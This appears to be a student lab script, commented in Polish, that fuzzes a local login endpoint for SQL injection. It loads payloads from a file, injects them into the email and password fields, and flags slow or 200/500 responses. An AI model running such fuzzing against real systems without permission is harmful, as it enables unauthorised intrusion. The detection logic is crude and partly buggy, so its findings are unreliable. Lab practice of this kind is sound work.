import requests
import time

PAYLOAD = []

#wczytanie payloadów z pliku
with open("lab 12/sqli-fuzz.txt", "r", encoding="utf-8") as file:
    for line in file.readlines():
        line.strip()
        PAYLOAD.append(line)

#wczytanie endpointów z pliku, wraz z parametrami do POST
POST = {
    "http://localhost:3000/rest/user/login" : ["email", "password"]
}

#opcjonalne nagłówki
HEADERS = {

}

#funkcja do skanowania SQL Injection
def scan_sql_injection(payoload, post_endpoints, headers):
    #iteracja przez payloady i endpointy
    for payload in PAYLOAD:
        for endpoint, params in POST.items():
            
            #tworzymy tymczasowe informacje
            data = ["temp"]*len(params)
            
            #iterujemy od tyłu parametry, by pokolejmy wstrzykiwać kod sql
            for i in range(len(params), 0, -1):
                try:
                    #zmieniamy tymczasową informacje na payload sql
                    data[i-1] = payload
                    
                    #tworzymy poprawne dane do wysłania do endpoint'u
                    post_data={}
                    for j in range(len(params)):
                        post_data[params[j]]=data[j]
                    
                    #liczmy czas by sprawdzić czy działąją skrypty czasowe w sql                    
                    start_time = time.time()
                    
                    #wysyłamy zapytanie do strony z nagłówkiem lub bez
                    if HEADERS == {}:
                        response = requests.post(endpoint, json=post_data)
                    else:
                        response = requests.post(endpoint, json=post_data, headers=HEADERS)
                    
                    #kończmy liczyć czas i sprawdzamy ile zajeło czasu od wysłania zapytania i dostania odpowiedzi
                    end_time = time.time()
                    elapsed_time = end_time - start_time

                    #jesli mineło 5sec lub wiecej, mozna uznac ze skrypt czasowy zadziałał pomyślnie
                    if elapsed_time >= 5:
                        print(f"Potencjalne SQLI znalezione w {endpoint} używając payload: {payload}, wstrzyknięte w parametr: {params[i-1]} (czas zajęty: {elapsed_time:.2f} sekund)")

                    #jeśli ma kod 200 lub 500 znaczy tez ze znaleźliśmy działający skrypt
                    if response.status_code == 500 or response.status_code == 200:
                        print(f"Potencjalne SQLI znalezione w {endpoint} używając payload: {payload}, wstrzyknięte w parametr: {params[i-1]}")
                
                #infomacje przy czym dostalismy błąd w skrypcie
                except requests.exceptions.Timeout as e:
                    print(f"Wystąpiło przekroczenie limitu czasu {endpoint} używając payload: {payload}, wstrzyknięte w parametr: {params[i-1]}") 
                except Exception as e:
                    print(f"Wystąpił bład w: {endpoint} używając payload: {payload}, wstrzyknięty w parametr: {params[i-1]} - {str(e)}")

if __name__ == "__main__":
    scan_sql_injection(PAYLOAD, POST, HEADERS)